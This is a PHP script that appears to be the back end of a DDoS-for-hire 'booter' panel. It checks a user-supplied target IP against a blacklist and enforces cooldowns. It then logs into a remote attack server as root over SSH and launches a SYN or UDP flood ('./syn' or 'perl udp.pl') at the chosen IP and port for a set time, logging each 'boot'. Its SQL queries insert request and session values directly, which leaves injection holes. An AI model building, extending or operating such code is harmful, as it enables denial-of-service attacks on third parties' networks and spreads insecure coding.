<?php

require('Smarty.class.php');
$smarty = new Smarty;

require_once('inc/db.php');
require_once('inc/functions.php');
require_once('inc/secur.php');

if (!filter_var($_POST['ip'], FILTER_VALIDATE_IP))
{
    die('Status: <span style="color: #e61e1e;">The IP address you entered is invalid</span>');
}

//IP Blacklist
$SQL = "SELECT * FROM `blacklist` WHERE `ip`='{$_POST[ip]}'";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());
$blcount = mysql_num_rows($query);

if ($blcount > 0)
{
	$timeNow = time();
	
	$SQL = "INSERT INTO `bad_logs` (`ip`, `username`, `user_ip`, `time`, `uid`) VALUES ('{$_POST[ip]}', '{$_SESSION[username]}', '{$_SESSION[REMOTE_ADDR]}', {$timeNow}, {$_SESSION[uid]})";
	$query = mysql_query($SQL, $dbLink) OR die(mysql_error());
	
	die('Status: <span style="color: #e61e1e;">The IP address you entered is protected.</span>');
}

$SQL = "SELECT `length` FROM `users` WHERE `id`={$_SESSION[uid]}";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());
$boot_length = mysql_result($query, 0);

if (!is_numeric($_POST['time']) || $_POST['time'] < 15 || $_POST['time'] > $boot_length)
{
	die('Status: <span style="color: #e61e1e;">The time you entered is invalid</span>');
}

if (!is_numeric($_POST['power']) || $_POST['power'] < 5 || $_POST['power'] > 100)
{
	die('Status: <span style="color: #e61e1e;">The power you entered is invalid</span>');
}

if (!is_numeric($_POST['port']) || $_POST['port'] < 1 || $_POST['port'] > 65565)
{
	die('Status: <span style="color: #e61e1e;">The port you entered is invalid</span>');
}

if ($_POST['type'] != "ssyn" && $_POST['type'] != "udp")
{
	die('Status: <span style="color: #e61e1e;">Invalid attack type</span>');
}

$timeNow = time();

$SQL = "SELECT * FROM `users` WHERE `id`={$uid}";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());
$result = mysql_fetch_array($query, MYSQL_ASSOC);

if ($timeNow < $result['next_boot'])
{
	$secondsLeft = $result['next_boot'] - $timeNow;
	die("Status: <span style=\"color: #e61e1e;\">You still need to wait {$secondsLeft} seconds.");
}

$SQL = "SELECT * FROM `servers` ORDER BY `last_attack` ASC LIMIT 1";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());
$attServer = mysql_fetch_array($query);

$sshCon = ssh2_connect($attServer['ip'], 22);
if (!$sshCon)
{
	die("Status: <span style=\"color: #e61e1e;\">Error connecting to attack server.");
}
ssh2_auth_password($sshCon, "root", $attServer['pass']);

if ($_POST['type'] == "ssyn")
{
	$sshCommand = "./syn {$_POST['ip']} {$_POST['port']} {$_POST['time']} > /dev/null &";
}
else if ($_POST['type'] == "udp")
{
	$sshCommand = "perl udp.pl {$_POST['ip']} {$_POST['port']} {$_POST['power']} {$_POST['time']} > /dev/null &";
}

ssh2_exec($sshCon, $sshCommand);

$SQL = "UPDATE `servers` SET `last_attack`={$timeNow} WHERE `ip`='{$attServer[ip]}'";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());

$newBootCount = $result['boot_count'] + 1;
$nextBoot = $timeNow + $_POST['time'];
$SQL = "UPDATE `users` SET `next_boot`={$nextBoot} WHERE `id`={$_SESSION[uid]}";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());

$_POST['type'] = strtoupper($_POST['type']);

$SQL = "INSERT INTO `boot_logs` (`uid`, `target`, `port`, `time`, `power`, `date`, `type`) VALUES ({$_SESSION[uid]}, '{$_POST[ip]}', '{$_POST[port]}', '{$_POST[time]}', '{$_POST[power]}', {$timeNow}, '{$_POST[type]}')";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());
$SQL = "UPDATE `users` SET `boot_count`={$newBootCount} WHERE `id`={$_SESSION[uid]}";
$query = mysql_query($SQL, $dbLink) OR die(mysql_error());

echo "Status: <span style=\"color: green;\">{$_POST['type']} attack successfully launched on {$_POST['ip']}:{$_POST['port']} at {$_POST['power']}% power for {$_POST['time']} seconds </span>";
?>